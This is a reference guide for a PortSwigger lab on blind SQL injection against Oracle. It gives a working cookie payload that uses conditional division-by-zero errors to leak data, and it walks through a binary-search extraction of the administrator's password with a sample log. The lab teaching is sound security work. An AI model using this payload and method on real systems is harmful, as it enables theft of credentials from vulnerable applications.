# Blind SQL Injection — Conditional Error (Oracle) — Reference Guide

> Lab: *Blind SQL injection with conditional errors* (PortSwigger Web Security Academy)
> Database: Oracle | Vulnerable input: `TrackingId` cookie

---

## 1. How the Vulnerability Works

The application takes the `TrackingId` cookie and puts it directly into a SQL query:

```sql
SELECT ... FROM tracking WHERE TrackingId = '<COOKIE_VALUE>'
```

- The **results** of the query are **never returned** (no output channel).
- The response is **identical** whether the query returns rows or not (no true/false channel).
- BUT — if the query **causes an error**, the application returns a **custom error message** (HTTP 500).

So we have a single signal: **"did the query error or not?"** We turn that into a boolean oracle.

---

## 2. The Core Idea — Turn One Bit Into an Error

Oracle trick: `SELECT CASE WHEN (condition) THEN TO_CHAR(1/0) ELSE '' END`

- If `condition` is **TRUE** → Oracle evaluates `TO_CHAR(1/0)` → **division by zero** → error → **HTTP 500**
- If `condition` is **FALSE** → returns `''` → query completes → **HTTP 200**

Full injected cookie value:

```
LMK5UZjmEu9RgHBC'||(SELECT CASE WHEN (CONDITION) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

Resulting server-side query:

```sql
SELECT ... WHERE TrackingId = 'LMK5UZjmEu9RgHBC'||
  (SELECT CASE WHEN (CONDITION)
          THEN TO_CHAR(1/0) ELSE '' END
   FROM users WHERE username='administrator')||''
```

**Convention (this is the whole oracle):**

| HTTP Status | Meaning            |
|-------------|--------------------|
| **500**     | condition = TRUE   |
| **200**     | condition = FALSE  |

---

## 3. Why This Works for ALL Keyboard Characters

Two common extraction strategies:

| Strategy | How it works | Charset limitation |
|---|---|---|
| Iterate charset | Loop over `CHARACTERS = "abc...xyz0123456789"`, test `=` each | Only chars you listed |
| **Binary search on code point** | Ask "is the char > N?" and halve the range | None — any code point |

The binary search only needs the comparison:

```sql
SUBSTR(password, position, 1) > CHR(N)
```

- `CHR(N)` in Oracle works for **ASCII (0–127) and Unicode** code points.
- So **every standard keyboard character** is reachable with range `32–126`
  (space, `a-z`, `A-Z`, `0-9`, `` `~!@#$%^&*()_+-={}[]|\:";'<>?,./ ``).
- No `CHARACTERS` string needed — the search space *is* the numeric range.

> If the password could contain extended characters (`£`, `é`, `©`), set
> `CHARSET_MODE = "unicode"` and the search range widens to `32–65535`
> (slower: ~16 comparisons per character instead of ~7).

---

## 4. Extraction Plan (3 Steps)

### Step 1 — Confirm injection
Send condition `1=1` (always TRUE) → expect **HTTP 500**.
If you get 500, the oracle works.

### Step 2 — Find password length
Ask `LENGTH(password) > 1`, `> 2`, ... until FALSE.
First FALSE answer = exact length.

**From the sample log:**
```
LENGTH(password)>19  -> HTTP 500 -> TRUE   (longer than 19)
LENGTH(password)>20  -> HTTP 200 -> FALSE  (NOT longer than 20)
=> password length = 20
```

### Step 3 — Binary search each character
For each position, narrow the code-point range `[low, high]`:

```
mid = (low + high) // 2
Is SUBSTR(password,pos,1) > CHR(mid)?
  TRUE  -> char is in (mid, high]  -> low = mid + 1
  FALSE -> char is in [low, mid]   -> high = mid
Repeat until low == high -> that code point IS the character.
```

Complexity: **~7 requests per character** for printable ASCII (range of 95)
instead of up to 95 with naive iteration.

---

## 5. Reading the Sample Log — Position 1 Walkthrough

Target: first character of a 20-char password, search range `[32, 126]`.

| # | Ask | HTTP | Meaning | New range |
|---|-----|------|---------|-----------|
| 1 | ASCII > 79 ? | 200 (FALSE) | char ≤ 79 | [32, 79] |
| 2 | ASCII > 55 ? | 200 (FALSE) | char ≤ 55 | [32, 55] |
| 3 | ASCII > 43 ? | 500 (TRUE)  | char > 43  | [44, 55] |
| 4 | ASCII > 49 ? | 500 (TRUE)  | char > 49  | [50, 55] |
| 5 | ASCII > 52 ? | 200 (FALSE) | char ≤ 52  | [50, 52] |
| 6 | ASCII > 51 ? | 500 (TRUE)  | char > 51  | [52, 52] |

`low == high == 52` → `chr(52) = '4'` → **password starts with `4`**. ✅

Note how the range `[32,126]` (95 candidates) collapsed to the exact answer
in only **6 requests**.

---

## 6. Full Working Script

See `BlindSQLConditionalError_AllChars.py` (delivered alongside this file).
Key knobs:

```python
CHARSET_MODE = "printable"   # 32-126: all standard keyboard chars
CHARSET_MODE = "unicode"     # 32-65535: extended chars too
```

---

## 7. Quick Troubleshooting

| Symptom | Likely cause | Fix |
|---|---|---|
| Every test returns FALSE (200) | Session/TrackingId expired | Refresh lab page, update cookies |
| Every test returns TRUE (500) | Payload quoting broken / wrong DB type | Recheck the `'||( ... )||'` wrapper; this payload is Oracle-specific |
| Random TRUE/FALSE flapping | Network instability / rate limiting | Increase `timeout`, add small delay between requests |
| Password contains weird char | Out of ASCII range | Switch to `CHARSET_MODE = "unicode"` |
| Script hangs on one position | Non-unique boundary (rare) | Log the exact condition and re-run it manually |

---

## 8. Key Takeaways

1. **Conditional errors** convert any silent failure into a 1-bit channel: 500 = true, 200 = false.
2. **Binary search beats charset iteration**: ~7 requests/char regardless of how large the alphabet is.
3. **`CHR(codepoint)` comparisons** remove the need to enumerate characters — the keyboard *is* the range 32–126.
4. Always **confirm the oracle first** (`1=1`), **fix the length second**, then extract.
